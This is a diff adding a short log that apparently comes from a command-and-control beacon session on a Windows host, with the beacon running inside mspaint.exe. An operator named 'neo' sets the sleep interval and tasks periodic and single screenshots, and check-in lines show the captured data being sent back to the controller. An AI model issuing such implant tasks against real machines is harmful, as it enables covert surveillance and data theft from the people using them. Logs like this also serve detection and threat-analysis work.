@@ -1,0 +1,19 @@
+01/06 07:58:48 UTC [metadata] 192.168.88.108 <- 192.168.88.108; computer: DESKTOP-29M090E; user: NITRO 5; process: mspaint.exe; pid: 10476; os: Windows; version: 10.0; build: 22621; beacon arch: x64 (x64)
+01/06 07:59:40 UTC [input] <neo> sleep 5
+01/06 07:59:40 UTC [task] <T1029> Tasked beacon to sleep for 5s
+01/06 07:59:48 UTC [checkin] host called home, sent: 47 bytes
+01/06 07:59:58 UTC [checkin] host called home, sent: 44 bytes
+01/06 08:00:03 UTC [checkin] host called home, sent: 32 bytes
+01/06 08:00:16 UTC [input] <neo> screenwatch 0 null
+01/06 08:00:16 UTC [task] <T1113, T1055> Tasked beacon to take periodic screenshots
+01/06 08:00:18 UTC [checkin] host called home, sent: 163948 bytes
+01/06 08:00:28 UTC [error] could not open process 0: 87
+01/06 08:00:28 UTC [error] Could not connect to pipe: 2
+01/06 08:00:54 UTC [input] <neo> screenshot 0 null
+01/06 08:00:54 UTC [task] <T1113, T1055> Tasked beacon to take screenshot
+01/06 08:00:58 UTC [checkin] host called home, sent: 163947 bytes
+01/06 08:01:08 UTC [input] <neo> screenshot
+01/06 08:01:08 UTC [task] <T1113, T1093> Tasked beacon to take screenshot
+01/06 08:01:08 UTC [error] could not open process 0: 87
+01/06 08:01:08 UTC [error] Could not connect to pipe: 2
+01/06 08:01:13 UTC [checkin] host called home, sent: 199779 bytes
